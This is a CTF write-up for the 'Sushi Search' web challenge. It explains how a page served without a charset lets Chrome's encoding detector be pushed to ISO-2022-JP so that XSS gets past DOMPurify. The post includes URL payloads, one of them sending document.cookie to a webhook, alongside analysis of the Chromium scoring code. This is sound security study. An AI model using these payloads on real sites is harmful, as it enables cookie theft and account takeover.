---
title: "Sushi Search and Chrome Detect Engine"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-08-27
draft: false
authors:
  - Hibwyli
---

# Sushi Search 
Read this before : 
[Blog](https://thenewstack.io/encoding-differentials-why-charset-matters/)

Type: Xss through missing charset

[Chromium detect engine ](https://source.chromium.org/chromium/chromium/src/+/main:third_party/ced/src/compact_enc_det/compact_enc_det.cc)


![image](https://hackmd.io/_uploads/ry6iR71NJl.png)

- This is really hard to me , and i just can solve after reading script :v 


## SOURCE CODE : 
- This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss.
But .... 
![image](https://hackmd.io/_uploads/BkyL1E1EJx.png)
:::danger
 They sanitize it with DomPurify at newest version !
:::

Pay attention in this code : 
![image](https://hackmd.io/_uploads/HkphkNJE1x.png)
- It doesnt specify an charset which lead to vulnerabilities.
Which leads to the wrong encoding heres of sushi emoji.
![image](https://hackmd.io/_uploads/rJjZM41EJl.png)
- But i read [this blog](https://thenewstack.io/encoding-differentials-why-charset-matters/) and i found a way to bypass.
- If we can someway to fool chrome engine to detect the charset as ISO_2022_JP, we can bypass easily with. 
``` javascript
/search?search= <a id="%1b$B"></a> %1B(B <a id="><img src=x onerror = fetch(`YOUR-WEB-HOOK?a=document.cookie`)>"></a> %1b$B %1b(B <repeat 1000 times>
```
- I cannot explain better the blog so read it :vvv .This is a valid DOM and dompurify wont sanitize this and then chrome parse it as ISO_2022_JP
**BOOOOOOOOOOOOOOOOOOOOOOM** 
We get xss :) 


## HARDEST THING 
### THE HARDEDST QUESTION IS HOW CHROME DETECT IT ? 
- Maybe you can just put a lot of bunchs of %1b$B and %1b(B  and hope chrome detect it  :vv 
#### There is something weird here when i try my exploit 
``` javascript
/search?search= <a id="%1b$B"></a> %1B(B <a id="><img src=x onerror = alert(1) >"></a>%1b$B %1b(B <repeat 10000 times>
```
``` javascript
/search?search= <a id="%1b$B"></a> %1B(B <a id="><img src=x onerror = alert(1111111111111111111111111)>"></a>%1b$B %1b(B <repeat 10000 times>
```

- Both of codes is just different at the length of alert right ? 
====== But (1) not works :vv ====== 
And (2) give me this ![image](https://hackmd.io/_uploads/r1-EGNJ4ye.png) -> chrome detect success ??

- It took me one day confusing and I decide to read chromium source code (in fact shin24 tells me :vv)

## CHROME DETECT ENGINE 
- It is too long to tell how the engine works but i will tell a little bit 
:::warning
 I just tell the way i understand because of so many blackbox. 
:::
- Its like a game of bunch encodings. Anyone has their own scores.
- Boost and Whack scores is main feature and the best will be chosen one.
## SLOW SCAN ( Which detects the ISO_2022_JP )
- It will scan 16KB of document and if it doesn't find any encodings, it will fast scan (256kb) which we dont talk about .
- Slow can will check only the interesting byte < 0x80 and 0x1b is in that case.
- ![image](https://hackmd.io/_uploads/BkHOXEkEyl.png)
Here is the scan_table it use to detect if that byte it interesting or not.
(!=0 -> interesting)

- So if it meets a interesting byte. First it will check if that bytes is inside a <tag></tag> or <script></script> or comment. If inside a **title tag** , it will be decreased the score it can boost, then skip to the end of tag just in case there is 12 bytes in title already.
![image](https://hackmd.io/_uploads/ByZRnGeN1g.png)

- Pay attention that in our case my input actually push into the title tag too.
![image](https://hackmd.io/_uploads/rk_GBE1NJx.png)
- However, there is something funny here when reading more  the logic check tag 
![image](https://hackmd.io/_uploads/BJtUrV141e.png)
- It loops back 192 bytes to find the "<" and ">" . Yeah like i say **"192"** bytes. So if you pad a bunch of "a" before your "%1b" , it won't be considered inside a title tag and they wont be skipped to tag end + keep full score weightshift !!!
- It seems the reason why exploit 2 works . Now let's dive deeper 

## ANOTHER QUESTION 
- BUT why we want to keep a bunch of data in title ?
-  When we can place it here ?
 ![image](https://hackmd.io/_uploads/SJ3yvEkVyl.png)
- Is it scored the same  ????

#### The fact is NO!

- In short, one scan just check 8 pairs of interesting bytes then pruning. If something get pruned , it is done and no get checked any more!!! And we dont want this 
- If the number of pairs is not divided by 8 , no boostPrune will happend
- Max pairs scanned === 48 pairs
## SO what is matter ? 
- The KEY IS THAT SUSHI !! 
- That emoji in bytes is 0xF0 0xF8 0x8a 0xa3 (take 4 bytes)
And if we look at the logic to boost  
![image](https://hackmd.io/_uploads/S1zf6zgE1e.png)
Logic to whack
![image](https://hackmd.io/_uploads/r1onDVJ4Jx.png)
BOOST a little and WHACK SO MUCH ! :vv
- First i think it not matter because 0xF0 is bigger than 0x1F right ? 
But when i try to debug, it happens, the 0xF0 is < 0x1F and it whack our score  so much!! 
![image](https://hackmd.io/_uploads/SJnsO4JVJg.png)

*I still dont make sense maybe because of signed number :v 
**SO the emoji whacking us too much !!!**
===>>> If we put data after sushi , there is no way to continue checking ISO due to pruned
## MATH TIMEEEE 
- In case we have 7 pair boost and 1 pair whack from sushi emoji
- BoostGentle = 60
- WhackBadPair = 600
Score = BOOST - WHACK = 7*60 - 600 = -180 points
- So we dont want to have any emoji get scanned pairs !!
---> If we set at title , it will get enough pairs before getting the sushi emoji
##  Conclusion 
- That is the reason we want to trim out the sushi emoji. And we need the assistance of title tag. 
- This challenge is really hard :vv

## MORE
I test in locally and it works with append a bunch of "a" and 8 pairs of "\x1b$B\x1b(B" so i hope its true :vv

---
v
![image](https://hackmd.io/_uploads/H1FlPSyEye.png)
![image](https://hackmd.io/_uploads/HJDzwHJ4Jl.png)
## WELL WELL TEST KNOWLEDGE
- If you understand you will know what happen if i put this sushi in another place @@ 
![image](https://hackmd.io/_uploads/Hy3FdryVJx.png)

---> It will be ISO_2022_JP :vvv